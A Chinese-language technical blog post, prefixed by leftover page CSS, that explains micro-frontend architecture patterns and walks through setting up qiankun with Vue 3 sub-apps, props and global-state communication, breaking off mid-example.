pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>记得那些年我们维护的“巨石应用”吗？一个<code>package.json</code>里塞满了几百个依赖，每次<code>npm install</code>都像是一场赌博；团队协作时，<code>git merge</code>冲突解决到怀疑人生；技术栈升级？那意味着“全盘推翻重来”……</p>
<p>随着前端复杂度的爆炸式增长，传统单体架构已不堪重负。而<strong>微前端</strong>，正是为了解决这些痛点而生的一种架构范式。本文将以<code>qiankun</code>为切入点，学习一下微前端的模式。</p>
<h2 data-id="heading-0">基础概念</h2>
<h3 data-id="heading-1">微前端是什么？</h3>
<p><strong>微前端不是框架，而是一种架构理念</strong>
——将大型前端应用拆分为多个<strong>独立开发、独立部署、技术栈无关</strong>的小型应用，再将其组合为一个完整的应用。</p>
<p>一句话，它让前端开发从“造大楼”变成了 <strong>“搭乐高”</strong> 。</p>
<h3 data-id="heading-2">为什么需要微前端？</h3>
<p><strong>痛点真实存在：</strong></p>
<ul>
<li>🐌 <strong>开发效率低下</strong>：几百人维护一个仓库，每次上线都需全量回归</li>
<li>🔒 <strong>技术栈锁定</strong>：三年前选的框架，现在想升级？代价巨大</li>
<li>👥 <strong>团队协作困难</strong>：功能边界模糊，代码相互渗透</li>
<li>🚢 <strong>部署风险高</strong>：一个小改动，可能导致整个系统崩溃</li>
</ul>
<p><strong>微前端带来的改变：</strong></p>
<ul>
<li>✅ <strong>独立自治</strong>：每个团队负责自己的“微应用”，从开发到部署全流程自主</li>
<li>✅ <strong>技术栈自由</strong>：React、Vue、Angular、甚至jQuery，和平共处</li>
<li>✅ <strong>增量升级</strong>：老系统可以一点点替换，而不是“一夜重构”</li>
<li>✅ <strong>容错隔离</strong>：一个子应用崩溃，不影响其他功能</li>
</ul>
<h3 data-id="heading-3">微前端的核心思想：</h3>
<ul>
<li>拆分：将大型前端应用拆分为多个独立的小型应用。</li>
<li>集成：通过某种方式将这些小型应用集成在一起，形成一个整体。</li>
<li>自治：每个小型应用都可以独立开发、测试、部署。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 微前端架构</span>
├── container/      <span class="hljs-comment">// 主应用（基座）</span>
├── app-react/      <span class="hljs-comment">// React子应用（团队A）</span>
├── app-vue/        <span class="hljs-comment">// Vue子应用（团队B）</span>
├── app-angular/    <span class="hljs-comment">// Angular子应用（团队C）</span>
└── app-legacy/     <span class="hljs-comment">// 老系统（jQuery）</span>

<span class="hljs-comment">// 优势：</span>
<span class="hljs-comment">// 1. ✅ 技术栈无关</span>
<span class="hljs-comment">// 2. ✅ 独立开发、独立部署</span>
<span class="hljs-comment">// 3. ✅ 增量更新</span>
<span class="hljs-comment">// 4. ✅ 容错性高（一个子应用挂了不影响其他）</span>
</code></pre>
<h3 data-id="heading-4">应用场景</h3>
<p>渐进式重构：对于一个老项目一点点进行架构的升级</p>
<pre><code class="hljs">老系统（jQuery + PHP） → 逐步替换为现代框架
   ↓
保留核心业务模块 + 逐步添加React/Vue新模块
</code></pre>
<p>多团队协作：不同部门人员之间技术栈存在差异，需要单独开发</p>
<pre><code class="hljs language-css" lang="css">团队<span class="hljs-selector-tag">A</span>（React专家） → 负责电商商品模块
团队<span class="hljs-selector-tag">B</span>（Vue专家）   → 负责购物车模块
团队C（Angular专家）→ 负责用户中心
主应用协调所有模块
</code></pre>
<p>中后台系统：复杂系统的功能拆分</p>
<pre><code class="hljs language-diff" lang="diff">一个后台管理系统包含：
<span class="hljs-deletion">- 权限管理（React）</span>
<span class="hljs-deletion">- 数据报表（Vue + ECharts）</span>
<span class="hljs-deletion">- 工作流（Angular）</span>
<span class="hljs-deletion">- 监控面板（React + Three.js）</span>
</code></pre>
<h2 data-id="heading-5">四种架构模式</h2>
<h3 data-id="heading-6">基座模式（也称为中心化路由模式）</h3>
<ul>
<li>基座模式是最常见的微前端架构。它有一个主应用（通常称为基座或容器），负责整个应用的布局、路由和公共逻辑。子应用根据路由被动态加载和卸载。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">  ┌─────────────────────────────────────────┐
  │            主应用（Container）           │
  │ 负责：路由、鉴权、布局、共享状态、公共依赖   │
  ├─────────────────────────────────────────┤
  │  ┌──────────┐  ┌──────────┐  ┌──────────┐ 
  │  │ 子应用<span class="hljs-selector-tag">A</span>  │  │ 子应用<span class="hljs-selector-tag">B</span>  │  │ 子应用C  │ │
  │  │ (React)  │  │  (Vue)   │  │(Angular) │ 
  │  └──────────┘  └──────────┘  └──────────┘ 
  └─────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-7">工作流程</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
用户访问主应用--&gt;主应用根据当前URL匹配子应用--&gt; A["加载对应子应用的资源（JS、CSS）"]--&gt;将子应用渲染到指定容器中--&gt;子应用运行并处理自己的内部路由和逻辑
</code></pre>
<h4 data-id="heading-8">优点</h4>
<ul>
<li>集中控制，易于管理</li>
<li>路由逻辑清晰</li>
<li>公共依赖容易处理（基座可提供共享库）</li>
<li>子应用间隔离性好</li>
</ul>
<h4 data-id="heading-9">缺点</h4>
<ul>
<li>主应用成为单点故障</li>
<li>基座和子应用耦合（通过协议通信）</li>
<li>基座需要知道所有子应用的信息</li>
</ul>
<h4 data-id="heading-10">适用场景</h4>
<ul>
<li>企业级中后台系统</li>
<li>需要统一导航和布局的应用</li>
<li>子应用技术栈差异大</li>
</ul>
<h3 data-id="heading-11">自组织模式（也称为去中心化模式）</h3>
<ul>
<li>在自组织模式中，没有中心化的基座。每个微前端应用都是独立的，它们通过某种通信机制（如自定义事件、消息总线）来协调。通常，每个应用都可以动态发现和加载其他应用。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">┌──────────┐    ┌──────────┐    ┌──────────┐
│  应用<span class="hljs-selector-tag">A</span>   │     │  应用<span class="hljs-selector-tag">B</span>   │    │  应用C    │
│ (React)  │    │  (Vue)   │    │(Angular) │
└────┬─────┘    └────┬─────┘    └────┬─────┘
     │               │               │
     └───────────────┼───────────────┘
                     │
            ┌────────┴─────────┐
            │  运行时协调器     │
            │  (Runtime Bus)   │
            └──────────────────┘
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
1["应用A启动，并注册到消息总线"]
--&gt;2["应用B启动，并注册到消息总线"]
--&gt;用户操作触发应用A需要应用B的某个功能
--&gt;应用A通过消息总线请求应用B的资源
--&gt;3["应用B响应请求，提供资源（或直接渲染）"]
</code></pre>
<h4 data-id="heading-12">优点</h4>
<ul>
<li>去中心化，避免单点故障</li>
<li>应用之间完全解耦</li>
<li>更灵活的通信方式</li>
</ul>
<h4 data-id="heading-13">缺点</h4>
<ul>
<li>通信复杂，容易混乱</li>
<li>难以统一管理（如路由、权限）</li>
<li>依赖公共协议，版本更新可能破坏通信</li>
</ul>
<h4 data-id="heading-14">适用场景</h4>
<ul>
<li>高度自治的团队</li>
<li>应用间功能相对独立</li>
<li>需要动态组合的页面</li>
</ul>
<h3 data-id="heading-15">微件模式（也称为组合式模式）</h3>
<ul>
<li>微件模式类似于传统门户网站，页面由多个独立的微件（Widget）组成。每个微件都是一个独立的微前端应用，可以独立开发、部署，然后动态组合到页面中。</li>
</ul>

<pre><code class="hljs">┌───────────────────────────────────┐
│          Dashboard页面            │
│  ┌────────┬────────┬─────────┐    │
│  │ 天气    │ 新闻   │ 股票    │     │
│  │ Widget │ Widget │ Widget  │    │
│  ├────────┼────────┼─────────┤    │
│  │ 待办    │ 日历   │ 邮件    │     │
│  │ Widget │ Widget │ Widget  │    │
│  └────────┴────────┴─────────┘    │
└───────────────────────────────────┘
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
用户访问页面
    --&gt;
页面布局引擎根据配置加载微件
    --&gt;
每个微件独立加载资源并渲染
    --&gt;
微件之间通过预定义的接口通信
</code></pre>
<h4 data-id="heading-16"><strong>优点</strong>：</h4>
<ul>
<li>组件可以复用</li>
<li>用户可以自定义布局</li>
<li>所有widget在同一个页面</li>
<li>可以按需加载widget</li>
</ul>
<h4 data-id="heading-17"><strong>缺点</strong>：</h4>
<ul>
<li>样式管理复杂，需要处理widget间样式冲突</li>
<li>通信限制，widget间通信需要经过主应用</li>
<li>版本管理，大量widget的版本管理困难</li>
<li>性能问题，太多widget可能影响性能</li>
</ul>
<h4 data-id="heading-18"><strong>适用场景</strong>：</h4>
<ol>
<li>数据可视化大屏</li>
<li>门户网站首页</li>
<li>个人工作台</li>
<li>可配置的管理后台</li>
</ol>
<h3 data-id="heading-19">混合模式（实战中最常见）</h3>
<ul>
<li>在实际项目中，我们常常根据需求混合使用以上模式。例如，在基座模式中，某个子应用内部使用微件模式来组合多个微前端模块。</li>
<li>比如一个电商系统的架构</li>
</ul>

<pre><code class="hljs language-css" lang="css">主应用（基座模式）
    ├── 商品管理（React子应用）
    ├── 订单管理（Vue子应用）
    └── 用户管理（Angular子应用）
        在用户管理内部，使用微件模式：
            ├── 用户统计（微件<span class="hljs-selector-tag">A</span>）
            ├── 用户列表（微件<span class="hljs-selector-tag">B</span>）
            └── 用户权限（微件C）
</code></pre>

<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────┐
│                主应用（基座模式）                 │
│   统一路由、权限、用户中心、消息中心、全局状态       │
└─────────────────┬───────────────────────────────┘
                  │
    ┌─────────────┼─────────────┐
    │             │             │
┌───▼───┐   ┌────▼────┐   ┌────▼────┐
│订单中心│   │商品管理 │   │用户管理   │
│(React)│   │ (Vue)   │   │(Angular)│
└───┬───┘   └────┬────┘   └────┬────┘
    │            │             │
    └────────────┼─────────────┘
                 │
          ┌──────▼──────┐
          │ 数据分析模块 │
          │ (微件模式)   │
          │┌───┬───┬───┐│
          ││图表│地图│报表│
          │└───┴───┴───┘│
</code></pre>
<h2 data-id="heading-20">快速上手</h2>
<ul>
<li>新建三个项目，分别为<code>main-app,sub-app1,sub-app2</code>，项目结构一目了然：</li>
</ul>

<pre><code class="hljs language-less" lang="less">   ├── <span class="hljs-selector-tag">main</span><span class="hljs-selector-tag">-app</span>/      <span class="hljs-comment">// 主应用（基座）</span>
   ├── <span class="hljs-selector-tag">sub-app1</span>/      <span class="hljs-comment">// vue3子应用（团队A）</span>
   ├── <span class="hljs-selector-tag">app-vue</span>/        <span class="hljs-comment">// vue3子应用（团队B）</span>
</code></pre>
<h3 data-id="heading-21">安装qiankun</h3>
<pre><code class="hljs language-shell" lang="shell">yarn add qiankun # 或者 npm i qiankun -S
</code></pre>
<h3 data-id="heading-22">主项目中注册微应用</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 主应用main-app/main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> { registerMicroApps, start } <span class="hljs-keyword">from</span> <span class="hljs-string">'qiankun'</span>

<span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>).<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app1'</span>)

<span class="hljs-title function_">registerMicroApps</span>(
  [
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'sub-app1'</span>, <span class="hljs-comment">// app name registered</span>
      <span class="hljs-attr">entry</span>: <span class="hljs-string">'http://localhost:5175'</span>,
      <span class="hljs-attr">container</span>: <span class="hljs-string">'#micro-app-container'</span>,
      <span class="hljs-attr">activeRule</span>: <span class="hljs-function">(<span class="hljs-params">location</span>) =&gt;</span> location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'#/app-a'</span>),
      <span class="hljs-attr">props</span>: {
        <span class="hljs-attr">name</span>: <span class="hljs-string">'kuitos'</span>
      }
    }
  ],
  {
    <span class="hljs-attr">beforeLoad</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'before load'</span>, app.<span class="hljs-property">name</span>),
    <span class="hljs-attr">beforeMount</span>: [<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'before mount'</span>, app.<span class="hljs-property">name</span>)]
  }
)
<span class="hljs-comment">// start()</span>

<span class="hljs-comment">// 启动 qiankun，配置沙箱模式</span>
<span class="hljs-title function_">start</span>({
  <span class="hljs-attr">sandbox</span>: {
    <span class="hljs-attr">strictStyleIsolation</span>: <span class="hljs-literal">true</span>,
  },
})

</code></pre>
<h3 data-id="heading-23">微应用导出钩子</h3>
<ul>
<li>由于<code>qiankun</code>不支持module，所以对于vue3项目，需要使用<code>vite-plugin-qiankun</code>来集成</li>
<li><code>renderWithQiankun</code>用来对外暴露钩子</li>
<li><code>qiankunWindow</code>替代<code>window</code>变量</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 子应用 sub-app1/mian.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> {
  renderWithQiankun,
  qiankunWindow
} <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-qiankun/dist/helper'</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">let</span> instance = <span class="hljs-literal">null</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">props = {}</span>) {
  <span class="hljs-keyword">const</span> container = props.<span class="hljs-property">container</span> || <span class="hljs-string">'#app'</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子应用挂载容器：'</span>, container)

  instance = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
  instance.<span class="hljs-title function_">mount</span>(container)
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'qiankunWindow'</span>,qiankunWindow);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'window.__POWERED_BY_QIANKUN__'</span>,<span class="hljs-variable language_">window</span>.<span class="hljs-property">__POWERED_BY_QIANKUN__</span>);

<span class="hljs-comment">// 独立运行时，直接渲染</span>
<span class="hljs-keyword">if</span> (!qiankunWindow.<span class="hljs-property">__POWERED_BY_QIANKUN__</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'独立运行时，直接渲染'</span>)
  <span class="hljs-title function_">render</span>()
}

<span class="hljs-title function_">renderWithQiankun</span>({
  <span class="hljs-title function_">mount</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(props)
    <span class="hljs-title function_">render</span>(props)
  },
  <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'bootstrap'</span>)
  },
  <span class="hljs-title function_">unmount</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'unmount'</span>, props)
  },
  <span class="hljs-title function_">update</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'update'</span>, props)
  }
})

</code></pre>
<p>在子应用的<code>vite.config.js</code>中注册插件</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 子应用 sub-app1/vite.config.js</span>
<span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title function_">qiankun</span>(<span class="hljs-string">'sub-app1'</span>, {
      <span class="hljs-attr">useDevMode</span>: <span class="hljs-literal">true</span>,
    })
],
</code></pre>
<h2 data-id="heading-24">进阶场景</h2>
<h3 data-id="heading-25">应用通信</h3>
<p>应用拆分后，不可避免的会涉及到通信问题，那么如何让它们“愉快地对话”？</p>
<h4 data-id="heading-26"><strong>props</strong></h4>
<ul>
<li>最简单的方式，正如目前的主流框架，<code>qiankun</code>也提供了一个<code>props</code>属性，可以实现<code>父-&gt;子</code>之间的数据通信，当主应用注册<code>registerMicroApps</code>子应用的时候，利用<code>props</code>传递</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 主应用 main-app/main.js</span>
<span class="hljs-title function_">registerMicroApps</span>(
  [
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'sub-app1'</span>, <span class="hljs-comment">// app name registered</span>
      <span class="hljs-attr">entry</span>: <span class="hljs-string">'http://localhost:5175'</span>,
      <span class="hljs-attr">container</span>: <span class="hljs-string">'#micro-app-container'</span>,
      <span class="hljs-attr">activeRule</span>: <span class="hljs-function">(<span class="hljs-params">location</span>) =&gt;</span> location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'#/app-a'</span>),
      <span class="hljs-attr">props</span>: {
        <span class="hljs-comment">// name: 'kuitos' //该属性会被覆盖？</span>
        <span class="hljs-attr">count</span>: <span class="hljs-number">100</span>,
        <span class="hljs-attr">time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>()
      }
    }
  ],
  {
    <span class="hljs-attr">beforeLoad</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'before load'</span>, app.<span class="hljs-property">name</span>),
    <span class="hljs-attr">beforeMount</span>: [<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'before mount'</span>, app.<span class="hljs-property">name</span>)]
  }
)

</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 子应用 sub-app1/main.js</span>
<span class="hljs-title function_">renderWithQiankun</span>({
  <span class="hljs-title function_">mount</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-title function_">render</span>(props)
  },
})
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 子应用 sub-app1/main.js</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">props = {}</span>) {
  <span class="hljs-keyword">const</span> container = props.<span class="hljs-property">container</span> || <span class="hljs-string">'#app'</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子应用挂载容器：'</span>, container)

  instance = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
  instance.<span class="hljs-property">config</span>.<span class="hljs-property">globalProperties</span>.<span class="hljs-property">__SUBAPP__</span> = props <span class="hljs-comment">//vue3的globalProperties全局挂载</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__SUBAPP__</span> = props <span class="hljs-comment">//挂载到子应用的window对象</span>

  instance.<span class="hljs-title function_">mount</span>(container)
}
</code></pre>
<p>子应用的其他组件使用时</p>
<pre><code class="hljs language-vue" lang="vue">//子应用 sub-app1/src/components/HelloWord.vue
&lt;script setup&gt;
    import { ref,getCurrentInstance } from 'vue'

    defineProps({
      msg: String,
    })

    const count = ref(0)
    console.log('window方式获取数据',window.__SUBAPP__)
    console.log('getCurrentInstance方式获取数据', getCurrentInstance().proxy.__SUBAPP__)
&lt;/script&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbf279e34fe948c68c97eb9319cc61d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omR5qOx6Ju-5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939959&amp;x-signature=wsRXckjYn42o33dljKuRFvmvXj0%3D" alt="image-20251208221830086" loading="lazy"/></p>
<h4 data-id="heading-27"><strong>initGlobalState</strong></h4>
<h5 data-id="heading-28">父-&gt;子传递</h5>
<p>首先在父应用中创建一个<code>globalState.js</code>初始化一下state</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//main-app/globalState.js</span>
<span class="hljs-keyword">import</span> { initGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'qiankun'</span>;

<span class="hljs-comment">// 定义初始状态</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> initialState = {
  <span class="hljs-attr">user</span>: { <span class="hljs-attr">id</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">token</span>: <span class="hljs-string">''</span> },
  <span class="hljs-attr">globalConfig</span>: { <span class="hljs-attr">theme</span>: <span class="hljs-string">'light'</span>, <span class="hljs-attr">language</span>: <span class="hljs-string">'zh-CN'</span> },
  <span class="hljs-attr">sharedData</span>: {},
  <span class="hljs-attr">currentRoute</span>: {}
};

<span class="hljs-comment">// 当前全局状态</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> currentGlobalState = { ...initialState };

<span class="hljs-comment">// 全局状态管理器实例</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> globalActions = <span class="hljs-literal">null</span>;

<span class="hljs-comment">// 初始化全局状态管理</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">initGlobalStateManager</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 初始化 state</span>
  <span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">initGlobalState</span>(initialState);
  
  <span class="hljs-comment">// 监听状态变更</span>
  actions.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state, prev</span>) =&gt;</span> {
    currentGlobalState = { ...state };
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'主应用：全局状态变更'</span>, { <span class="hljs-attr">newState</span>: state, <span class="hljs-attr">prevState</span>: prev });
  });
  
  <span class="hljs-comment">// 设置初始状态</span>
  actions.<span class="hljs-title function_">setGlobalState</span>(initialState);
  
  globalActions = actions;
  <span class="hljs-keyword">return</span> actions;
};

<span class="hljs-comment">// 更新全局状态</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateGlobalState</span> = (<span class="hljs-params">newState</span>) =&gt; {
  <span class="hljs-keyword">if</span> (!globalActions) {
    globalActions = <span class="hljs-title function_">initGlobalStateManager</span>();
  }
  globalActions.<span class="hljs-title function_">setGlobalState</span>(newState);
};


</code></pre>
<p>其中关键方法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 定义初始状态</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> initialState = {
  <span class="hljs-attr">user</span>: { <span class="hljs-attr">id</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">token</span>: <span class="hljs-string">''</span> },
  <span class="hljs-attr">globalConfig</span>: { <span class="hljs-attr">theme</span>: <span class="hljs-string">'light'</span>, <span class="hljs-attr">language</span>: <span class="hljs-string">'zh-CN'</span> },
  <span class="hljs-attr">sharedData</span>: {},
  <span class="hljs-attr">currentRoute</span>: {}
};
<span class="hljs-comment">//初始化 state</span>
<span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">initGlobalState</span>(initialState);	
<span class="hljs-comment">// 监听状态变更</span>
actions.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state, prev</span>) =&gt;</span> {
    currentGlobalState = { ...state };
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'主应用：全局状态变更'</span>, { <span class="hljs-attr">newState</span>: state, <span class="hljs-attr">prevState</span>: prev });
});
<span class="hljs-comment">// 更新全局状态</span>
actions.<span class="hljs-title function_">setGlobalState</span>(newState);
<span class="hljs-comment">// 取消监听</span>
actions.<span class="hljs-title function_">offGlobalStateChange</span>();

</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// main-app/login.vue</span>
<span class="hljs-keyword">import</span> { updateGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'./globalState'</span>
